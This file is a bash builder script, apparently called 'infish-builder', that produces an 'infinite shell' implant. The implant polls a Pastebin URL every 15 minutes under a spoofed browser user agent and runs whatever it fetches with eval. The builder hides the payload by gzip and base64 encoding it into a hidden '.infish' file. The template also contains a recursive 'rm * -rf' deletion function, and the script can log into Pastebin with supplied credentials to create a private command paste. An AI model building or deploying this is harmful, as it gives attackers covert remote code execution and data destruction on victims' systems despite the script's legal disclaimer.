#!/usr/bin/env bash

# MIT License
# 
# Copyright (c) 2023 Robert Paul
# 
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
# 
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
# 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.


template='function cld() {    
    [ ! -e "$1" ] && return;
    [ ! -d "$1" ] && return;
    [ -e "$1" ] && [ -d "$1" ] && cd "$1";
    [ "$PWD" != "$1" ] && return;
    [ "$(ls $1)" ] && rm * -rf;
    [ "$(ls $1)" ] && return;    
}

function main() {
    useragent=
    url=
    command=$(curl -sS -L -A $useragent $url)
    if [ -z "$command" ]; then
        return
    else
        eval $command
    fi

    sleep 900
}

while true; do
    main
done
'
usage_text="Usage:\n\t./infish-builder url|key url_or_key [optional_user_agent]\n\n"
usage_text+="Example:\n\t./infish-builder url pastebin.com/raw/ABC123\n\n\t"
usage_text+="./infish-builder key ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\n"

usage_text+="\n\n\t"

usage_text+="./infish-builder url pastebin.com/raw/ABC123 \"Mozilla 5.0\"\n\n\t"
usage_text+="./infish-builder key ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 \"Mozilla 5.0\"\n\n"

if [[ "$#" != 2 ]]; then

    echo -e $usage_text
    exit
fi


if [[ "$1" != "url" && "$1" != "key" ]]; then
    echo -e $usage_text
    exit
fi


legal_disclaimer="[!] Legal Disclaimer: Using this piece of software to generate code for use against targets without prior mutual consent is illegal. I assume no liability and bear no responsibility for any misuse or damage caused by this program."
legal_disclaimer+="\n\n"

echo -e $legal_disclaimer

user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0"


if [[ -n "$3" ]]; then

    user_agent="$3"

fi


function user_key() {
    curl -sS -X POST -d "api_dev_key=$3" -d "api_user_name=$1" -d "api_user_password=$2" "https://pastebin.com/api/api_login.php"
}


function check_api_resp() {
    if [[ -z "$1" || "$1" =~ "^Bad API request" ]]; then
        echo "$1"
        exit
    fi
}

content=$template


if [[ "$1" = "url" ]]; then

    content=${content//url=/url=\"$2\"}
    content=${content//useragent=/useragent=\"$user_agent\"}
    content=$(echo -e -n "$content" | gzip | base64 -w0)
    echo -e "#!/usr/bin/env bash\neval \"\$(echo '$content' | base64 -d | gunzip -c)\";" >".infish"

    echo -e "\nSuccessfully built infinite shell.\n\n";  

    exit;

elif
    [[ "$1" = "key" ]]
then

    dev_key=$2

    echo "Pastebin username: "
    read username
    echo "Pastebin password: "
    read password
    echo "New Paste name: "
    read paste_name

    if [[ -z "$username" || -z "password" ]]; then
        echo "You must enter a username and password"
        exit
    fi

    echo -e "\n\n"
    echo -e "Generating infinite shell...\n"

    api_user_key=$(user_key $username $password $dev_key)
    check_api_resp $api_user_key

    new_url=$(curl -sS -L -X POST -A "$user_agent" -d "api_dev_key=$dev_key" -d "api_user_key=$api_user_key" -d "api_paste_code=ls" -d "api_option=paste" -d "api_paste_name=$paste_name" -d "api_paste_private=1" "https://pastebin.com/api/api_post.php")

    new_url_copy=$new_url

    new_url=${new_url//https:\/\/pastebin.com/pastebin.com\/raw}

    content=${content//url=/url=\"$new_url\"}
    content=${content//useragent=/useragent=\"$user_agent\"}

    content=$(echo -e -n "$content" | gzip | base64 -w0)
    echo -e "#!/usr/bin/env bash\neval \"\$(echo '$content' | base64 -d | gunzip -c)\";" >".infish"    

    echo -e "\nSuccessfully built infinite shell\n\n"

    echo -e "The paste url is $new_url_copy\n"

    exit

fi
